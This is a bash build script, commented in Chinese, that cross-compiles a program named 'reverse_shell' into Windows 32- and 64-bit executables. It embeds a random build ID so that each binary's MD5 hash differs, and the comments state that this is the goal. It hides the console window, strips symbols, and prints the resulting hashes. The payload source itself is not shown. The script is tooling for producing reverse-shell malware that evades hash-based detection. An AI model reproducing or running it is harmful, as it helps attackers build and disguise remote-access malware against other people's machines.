#!/bin/bash

# 交叉编译脚本 - 在 macOS/Linux 上编译 Windows 可执行文件
# 需要安装 mingw-w64: brew install mingw-w64

OUTPUT_NAME="reverse_shell"
OUTPUT_DIR="./bin"

# 生成随机字符串（每次编译不同，使MD5变化）
RANDOM_STR=$(head -c 16 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9' | head -c 16)
BUILD_TIME=$(date +%s)
BUILD_ID="${RANDOM_STR}_${BUILD_TIME}"

echo "[*] Build ID: $BUILD_ID"

# 创建输出目录
mkdir -p "$OUTPUT_DIR"

echo "[*] Building Windows executables..."

# 定义编译宏注入 buildID
BUILD_FLAGS="-DBUILD_ID=\"\\\"$BUILD_ID\\\"\""

# Windows 64位
echo "[+] Compiling Windows x86_64..."
x86_64-w64-mingw32-gcc main.c -o "$OUTPUT_DIR/${OUTPUT_NAME}_win64.exe" \
    -lws2_32 \
    -mwindows \
    -s \
    $BUILD_FLAGS \
    2>/dev/null

if [ $? -eq 0 ]; then
    echo "    SUCCESS: ${OUTPUT_NAME}_win64.exe"
else
    echo "    FAILED: x86_64-w64-mingw32-gcc not found?"
    echo "    Install with: brew install mingw-w64"
fi

# Windows 32位
echo "[+] Compiling Windows i686..."
i686-w64-mingw32-gcc main.c -o "$OUTPUT_DIR/${OUTPUT_NAME}_win32.exe" \
    -lws2_32 \
    -mwindows \
    -s \
    $BUILD_FLAGS \
    2>/dev/null

if [ $? -eq 0 ]; then
    echo "    SUCCESS: ${OUTPUT_NAME}_win32.exe"
else
    echo "    FAILED: i686-w64-mingw32-gcc not found?"
fi

echo ""
echo "[*] Build complete! Output files:"
ls -lh "$OUTPUT_DIR" 2>/dev/null

echo ""
echo "[*] File hashes (MD5):"
md5 "$OUTPUT_DIR"/*.exe 2>/dev/null || md5sum "$OUTPUT_DIR"/*.exe 2>/dev/null

echo ""
echo "[*] File hashes (SHA256):"
shasum -a 256 "$OUTPUT_DIR"/*.exe 2>/dev/null || sha256sum "$OUTPUT_DIR"/*.exe 2>/dev/null
